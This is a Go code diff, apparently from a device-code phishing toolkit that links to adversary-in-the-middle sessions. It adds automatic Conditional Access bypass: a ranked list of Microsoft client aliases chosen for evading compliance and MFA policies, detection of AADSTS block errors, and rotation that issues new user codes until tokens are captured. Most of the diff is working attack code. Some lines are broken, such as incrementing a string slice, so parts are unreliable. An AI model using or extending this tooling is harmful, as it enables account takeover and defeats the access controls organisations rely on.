@@ -139,6 +139,60 @@ var FOCIClients = []string{
 	"844cca35-0656-46ce-b636-13f48b0eecbd", // Microsoft To-Do
 }
 
+// CAPBypassClients is the ordered list of client aliases to try for Conditional Access bypass.
+// These are sorted by probability of bypassing strict CAP policies (highest first).
+// The system will automatically cycle through these when CAP blocks are detected.
+var CAPBypassClients = []string{
+	"ms_cxh_host",      // Windows Cloud Experience Host - OOBE, often exempt from device compliance
+	"ms_auth_broker",   // Microsoft Authentication Broker - device registration, usually whitelisted
+	"ms_intune_portal", // Intune Company Portal - required TO BECOME compliant (circular dependency)
+	"ms_wam",           // Windows Azure AD broker - core Windows identity component
+	"ms_intune_enroll", // Intune enrollment service
+	"ms_aad_reg",       // Azure AD Registered Device - PRT bootstrap
+	"azure_cli",        // Azure CLI - admin tool often whitelisted by IT
+	"ms_365",           // Microsoft 365 unified app (newer, may have better treatment)
+	"azure_ps",         // Azure PowerShell - admin tool
+	"ms_vs",            // Visual Studio - developer tool often whitelisted
+	"ms_edge",          // Microsoft Edge with native Entra ID
+	"ms_office_hub",    // Office Hub (FOCI member)
+	"ms_teams",         // Teams (FOCI member)
+	"ms_office",        // Standard Office (last resort)
+}
+
+// CAPErrorPatterns contains error strings that indicate a Conditional Access Policy block
+var CAPErrorPatterns = []string{
+	"AADSTS53000", // Device compliance required
+	"AADSTS53001", // Device not compliant
+	"AADSTS53002", // Device needs to be managed
+	"AADSTS53003", // Access blocked by Conditional Access
+	"AADSTS53004", // ProofUp required (MFA enrollment)
+	"AADSTS50076", // MFA required
+	"AADSTS50079", // MFA enrollment required
+	"AADSTS50105", // Admin has not authorized user
+	"AADSTS50126", // Invalid credentials (may be CAP-related)
+	"AADSTS50158", // External security challenge required
+	"AADSTS65001", // User hasn't consented to app (may need admin consent)
+	"AADSTS70011", // Invalid scope
+	"AADSTS700016", // App not found in tenant
+	"does not meet the criteria",
+	"access to this resource",
+	"Conditional Access",
+	"device compliance",
+	"sign-in was successful but",
+	"restricted by your admin",
+}
+
+// IsCAPError checks if an error message indicates a Conditional Access block
+func IsCAPError(errMsg string) bool {
+	errLower := strings.ToLower(errMsg)
+	for _, pattern := range CAPErrorPatterns {
+		if strings.Contains(errLower, strings.ToLower(pattern)) {
+			return true
+		}
+	}
+	return false
+}
+
 // GoogleClientSecrets stores client_secret for Google OAuth clients that require it
 // Google device code flow requires client_secret (unlike Microsoft which uses public clients)
 var GoogleClientSecrets = map[string]string{
@@ -291,8 +345,13 @@ type DeviceCodeSession struct {
 	GoogleUser    *GoogleUserInfo   `json:"google_user,omitempty"`
 	LinkedSession string            `json:"linked_session,omitempty"` // Linked AitM session ID
 	Metadata      map[string]string `json:"metadata,omitempty"`
-	pollCancel    chan struct{}
-	mu            sync.Mutex
+	// CAP Bypass fields
+	CAPBypassMode      bool     `json:"cap_bypass_mode"`       // Whether auto-CAP-bypass is enabled
+	CAPBypassIndex     int      `json:"cap_bypass_index"`      // Current position in CAPBypassClients
+	CAPBypassAttempted []string `json:"cap_bypass_attempted"`  // Clients that have been tried
+	CAPBypassSuccess   string   `json:"cap_bypass_success"`    // Client that successfully bypassed CAP
+	pollCancel         chan struct{}
+	mu                 sync.Mutex
 }
 
 // GoogleUserInfo from Google's userinfo endpoint
@@ -346,11 +405,18 @@ func (m *DeviceCodeManager) SetOnCapture(fn func(session *DeviceCodeSession)) {
 }
 
 // RequestDeviceCode initiates a new device code flow (auto-detects provider from client alias)
+// Special aliases:
+//   - "cap_bypass" or "bypass": Automatically cycles through CAP bypass clients on failure
 func (m *DeviceCodeManager) RequestDeviceCode(clientAlias string, scopePreset string) (*DeviceCodeSession, error) {
+	// Handle special CAP bypass mode
+	if clientAlias == "cap_bypass" || clientAlias == "bypass" {
+		return m.RequestDeviceCodeWithCAPBypass(scopePreset)
+	}
+
 	// Resolve client ID
 	client, ok := KnownClientIDs[clientAlias]
 	if !ok {
-		return nil, fmt.Errorf("unknown client: %s (available: %s)", clientAlias, m.GetClientNames())
+		return nil, fmt.Errorf("unknown client: %s (available: %s, cap_bypass)", clientAlias, m.GetClientNames())
 	}
 
 	// Resolve scope
@@ -460,6 +526,147 @@ func (m *DeviceCodeManager) requestDeviceCodeInternal(provider string, clientID 
 	m.mu.Unlock()
 
 	return session, nil
+}
+
+// ============================================================================
+// CAP BYPASS AUTO-ROTATION
+// ============================================================================
+// These functions automatically cycle through multiple client IDs when
+// Conditional Access policies block access. The system tries each client
+// in CAPBypassClients order until one succeeds.
+
+// RequestDeviceCodeWithCAPBypass initiates a device code with CAP bypass enabled.
+// It starts with the first client in CAPBypassClients and will automatically
+// rotate to the next client if a CAP block is detected during polling.
+func (m *DeviceCodeManager) RequestDeviceCodeWithCAPBypass(scopePreset string) (*DeviceCodeSession, error) {
+	if len(CAPBypassClients) == 0 {
+		return nil, fmt.Errorf("no CAP bypass clients configured")
+	}
+
+	// Start with the first bypass client
+	firstClientAlias := CAPBypassClients[0]
+	client, ok := KnownClientIDs[firstClientAlias]
+	if !ok {
+		return nil, fmt.Errorf("first bypass client %s not found in KnownClientIDs", firstClientAlias)
+	}
+
+	// Resolve scope
+	scope, ok := ScopePresets[scopePreset]
+	if !ok {
+		scope = scopePreset
+	}
+
+	log.Info("[devicecode] Starting CAP bypass mode with %d clients to try", len(CAPBypassClients))
+	log.Info("[devicecode] Client rotation order: %s", strings.Join(CAPBypassClients, " -> "))
+	log.Info("[devicecode] Trying client 1/%d: %s", len(CAPBypassClients), client.Name)
+
+	session, err := m.requestDeviceCodeInternal(client.Provider, client.ClientID, client.Name, "", scope)
+	if err != nil {
+		return nil, err
+	}
+
+	// Enable CAP bypass mode on the session
+	session.mu.Lock()
+	session.CAPBypassMode = true
+	session.CAPBypassIndex = 0
+	session.CAPBypassAttempted = []string{firstClientAlias}
+	session.Scope = scope // Store original scope for rotation
+	session.mu.Unlock()
+
+	return session, nil
+}
+
+// rotateCAPBypassClient moves to the next CAP bypass client after a CAP error.
+// Returns true if a new client was started, false if all clients exhausted.
+func (m *DeviceCodeManager) rotateCAPBypassClient(session *DeviceCodeSession) bool {
+	session.mu.Lock()
+	currentIndex := session.CAPBypassIndex
+	scope := session.Scope
+	session.mu.Unlock()
+
+	nextIndex := currentIndex + 1
+	if nextIndex >= len(CAPBypassClients) {
+		log.Error("[devicecode] [%s] All %d CAP bypass clients exhausted - no bypass found", session.ID, len(CAPBypassClients))
+		session.mu.Lock()
+		session.State = DCStateFailed
+		session.Error = "All CAP bypass clients exhausted - tenant has strict Conditional Access"
+		session.mu.Unlock()
+		return false
+	}
+
+	nextClientAlias := CAPBypassClients[nextIndex]
+	client, ok := KnownClientIDs[nextClientAlias]
+	if !ok {
+		log.Error("[devicecode] [%s] Bypass client %s not found", session.ID, nextClientAlias)
+		return m.rotateCAPBypassClient(session) // Skip and try next
+	}
+
+	log.Warning("[devicecode] [%s] CAP block detected! Rotating to client %d/%d: %s",
+		session.ID, nextIndex+1, len(CAPBypassClients), client.Name)
+
+	// Request new device code with next client (reuse same session ID structure)
+	tenant := m.GetTenant()
+	deviceCodeURL := fmt.Sprintf(MS_DEVICE_CODE_URL, tenant)
+
+	data := url.Values{}
+	data.Set("client_id", client.ClientID)
+	data.Set("scope", scope)
+
+	resp, err := http.PostForm(deviceCodeURL, data)
+	if err != nil {
+		log.Error("[devicecode] [%s] Failed to request new device code: %v", session.ID, err)
+		session.mu.Lock()
+		session.CAPBypassIndex = nextIndex
+		session.CAPBypassAttempted = append(session.CAPBypassAttempted, nextClientAlias)
+		session.mu.Unlock()
+		return m.rotateCAPBypassClient(session) // Try next
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Error("[devicecode] [%s] Failed to read response: %v", session.ID, err)
+		return false
+	}
+
+	if resp.StatusCode != 200 {
+		var errResp TokenErrorResponse
+		json.Unmarshal(body, &errResp)
+		log.Error("[devicecode] [%s] Device code request failed: %s", session.ID, errResp.ErrorDescription)
+		session.mu.Lock()
+		session.CAPBypassIndex = nextIndex
+		session.CAPBypassAttempted = append(session.CAPBypassAttempted, nextClientAlias)
+		session.mu.Unlock()
+		return m.rotateCAPBypassClient(session) // Try next
+	}
+
+	var dcResp DeviceCodeResponse
+	if err := json.Unmarshal(body, &dcResp); err != nil {
+		log.Error("[devicecode] [%s] Failed to parse response: %v", session.ID, err)
+		return false
+	}
+
+	// Update session with new device code (IMPORTANT: new user code!)
+	session.mu.Lock()
+	session.ClientID = client.ClientID
+	session.ClientName = client.Name
+	session.DeviceCode = dcResp.DeviceCode
+	session.UserCode = dcResp.UserCode
+	session.ExpiresAt = time.Now().Add(time.Duration(dcResp.ExpiresIn) * time.Second)
+	session.Interval = dcResp.Interval
+	session.CAPBypassIndex = nextIndex
+	session.CAPBypassAttempted = append(session.CAPBypassAttempted, nextClientAlias)
+	if session.Interval < 5 {
+		session.Interval = 5
+	}
+	session.mu.Unlock()
+
+	log.Success("[devicecode] [%s] New device code generated: %s (client: %s)",
+		session.ID, dcResp.UserCode, client.Name)
+	log.Info("[devicecode] [%s] User must enter NEW code: %s at microsoft.com/devicelogin",
+		session.ID, dcResp.UserCode)
+
+	return true
 }
 
 // StartPolling begins background polling for token capture
@@ -592,7 +799,53 @@ func (m *DeviceCodeManager) pollForToken(session *DeviceCodeSession) {
 				session.mu.Unlock()
 				log.Warning("[devicecode] [%s] device code expired", session.ID)
 				return
+			case "access_denied", "interaction_required":
+				// Check for CAP (Conditional Access Policy) error and auto-rotate client
+				if session.CAPBypassMode && IsCAPError(errResp.ErrorDescription) {
+					session.CAPBypassAttempted++
+					log.Warning("[devicecode] [%s] CAP BLOCK DETECTED (client: %s): %s", session.ID, session.ClientName, errResp.ErrorDescription)
+					
+					if m.rotateCAPBypassClient(session) {
+						log.Info("[devicecode] [%s] Rotated to bypass client %d/%d: %s - NEW CODE: %s", 
+							session.ID, session.CAPBypassIndex+1, len(CAPBypassClients), session.ClientName, session.UserCode)
+						ticker.Reset(time.Duration(session.Interval) * time.Second)
+						continue
+					}
+					// All bypass clients exhausted
+					session.mu.Lock()
+					session.State = DCStateFailed
+					session.Error = fmt.Sprintf("CAP bypass failed - all %d clients blocked: %s", len(CAPBypassClients), errResp.ErrorDescription)
+					session.mu.Unlock()
+					log.Error("[devicecode] [%s] CAP bypass EXHAUSTED - all %d clients blocked", session.ID, len(CAPBypassClients))
+					return
+				}
+				// Not in bypass mode or not a CAP error - fail normally
+				session.mu.Lock()
+				session.State = DCStateFailed
+				session.Error = errResp.ErrorDescription
+				session.mu.Unlock()
+				log.Error("[devicecode] [%s] access denied: %s", session.ID, errResp.ErrorDescription)
+				return
 			default:
+				// Check for CAP error in any error response
+				if session.CAPBypassMode && IsCAPError(errResp.ErrorDescription) {
+					session.CAPBypassAttempted++
+					log.Warning("[devicecode] [%s] CAP BLOCK DETECTED (client: %s): %s", session.ID, session.ClientName, errResp.ErrorDescription)
+					
+					if m.rotateCAPBypassClient(session) {
+						log.Info("[devicecode] [%s] Rotated to bypass client %d/%d: %s - NEW CODE: %s", 
+							session.ID, session.CAPBypassIndex+1, len(CAPBypassClients), session.ClientName, session.UserCode)
+						ticker.Reset(time.Duration(session.Interval) * time.Second)
+						continue
+					}
+					// All bypass clients exhausted
+					session.mu.Lock()
+					session.State = DCStateFailed
+					session.Error = fmt.Sprintf("CAP bypass failed - all %d clients blocked: %s", len(CAPBypassClients), errResp.ErrorDescription)
+					session.mu.Unlock()
+					log.Error("[devicecode] [%s] CAP bypass EXHAUSTED - all %d clients blocked", session.ID, len(CAPBypassClients))
+					return
+				}
 				session.mu.Lock()
 				session.State = DCStateFailed
 				session.Error = errResp.ErrorDescription
